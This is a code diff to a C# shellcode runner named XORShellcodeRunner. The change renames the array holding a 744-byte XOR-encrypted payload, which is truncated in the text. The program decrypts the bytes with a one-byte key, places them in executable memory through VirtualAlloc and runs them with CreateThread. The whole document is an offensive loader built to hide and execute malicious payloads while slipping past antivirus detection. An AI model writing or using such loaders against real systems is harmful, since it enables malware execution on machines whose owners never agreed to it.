@@ -23,21 +23,22 @@ namespace XORShellcodeRunner
 
         static void Main(string[] args)
         {
-            byte[] encryptedShellcode = new byte[744] { 0xfe, 0x4a, 0x85, 0xe6, /* ... */ };
+            // Copy Array Length and Encrypted Shellcode
+            byte[] buf = new byte[744] { 0xfe, 0x4a, 0x85, 0xe6 ... };
             
             byte xorKey = 0x02; // XOR decryption key, the same as the one used during encryption
 
             // Decrypting Shellcode
-            for (int i = 0; i < encryptedShellcode.Length; i++)
+            for (int i = 0; i < buf.Length; i++)
             {
-                encryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ xorKey);
+                buf[i] = (byte)(buf[i] ^ xorKey);
             }
 
-            int size = encryptedShellcode.Length;
+            int size = buf.Length;
 
             IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
 
-            Marshal.Copy(encryptedShellcode, 0, addr, size);
+            Marshal.Copy(buf, 0, addr, size);
 
             IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                 IntPtr.Zero, 0, IntPtr.Zero);
